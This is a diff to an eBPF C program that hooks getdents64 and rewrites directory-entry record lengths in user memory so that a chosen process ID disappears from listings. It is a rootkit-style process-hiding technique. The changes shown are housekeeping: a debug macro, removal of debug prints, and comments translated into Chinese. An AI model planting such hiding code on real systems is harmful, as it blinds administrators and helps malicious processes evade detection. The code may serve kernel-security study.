@@ -13,7 +13,10 @@ volatile int target_ppid = 0;
 
 //宏定义
 #define MAX_PID_LEN 10
-//只
+// 定义调试宏，编译时可通过 -DDEBUG_MODE 启用
+// #define DEBUG_MODE
+
+//待隐藏的pid进程的名称
 const volatile int pid_to_hide_len = 0;
 const volatile char pid_to_hide[MAX_PID_LEN];
 
@@ -79,10 +82,12 @@ int handle_getdents_enter(struct trace_event_raw_sys_enter *ctx) {
         }
     }
 
+    #ifdef DEBUG_MODE
     int pid = pid_tgid >> 32;
     unsigned int fd = ctx->args[0];
     unsigned int buff_count = ctx->args[2];
     bpf_printk("getdents64 called with pid: %d, fd: %d, buff_count: %d\n", pid, fd, buff_count);
+    #endif
 
     // 获取目录项的缓冲区地址，并保存到映射表中
     struct linux_dirent64 *dirp = (struct linux_dirent64 *)ctx->args[1];
@@ -205,20 +210,11 @@ int handle_getdents_patch(struct trace_event_raw_sys_exit *ctx) {
     //4. 读取要隐藏的目录项的长度
     bpf_probe_read_user(&d_reclen, sizeof(d_reclen), &dirp->d_reclen);
 
-    // Debug print
-    char filename[MAX_PID_LEN];
-    bpf_probe_read_user_str(&filename, pid_to_hide_len, dirp_previous->d_name);
-    filename[pid_to_hide_len-1] = 0x00;
-    bpf_printk("[PID_HIDE] filename previous %s\n", filename);
-    bpf_probe_read_user_str(&filename, pid_to_hide_len, dirp->d_name);
-    filename[pid_to_hide_len-1] = 0x00;
-    bpf_printk("[PID_HIDE] filename next one %s\n", filename);
-
     // Attempt to overwrite
     short unsigned int d_reclen_new = d_reclen_previous + d_reclen;
     long ret = bpf_probe_write_user(&dirp_previous->d_reclen, &d_reclen_new, sizeof(d_reclen_new));
 
-    // Send an event
+    // 将event事件从内核态发送到用户态
     struct event *e;
     e = bpf_ringbuf_reserve(&rb, sizeof(*e), 0);
     if (e) {
@@ -227,7 +223,6 @@ int handle_getdents_patch(struct trace_event_raw_sys_exit *ctx) {
         bpf_get_current_comm(&e->comm, sizeof(e->comm));
         bpf_ringbuf_submit(e, 0);
     }
-
 
     bpf_map_delete_elem(&map_to_patch, &pid_tgid);
 
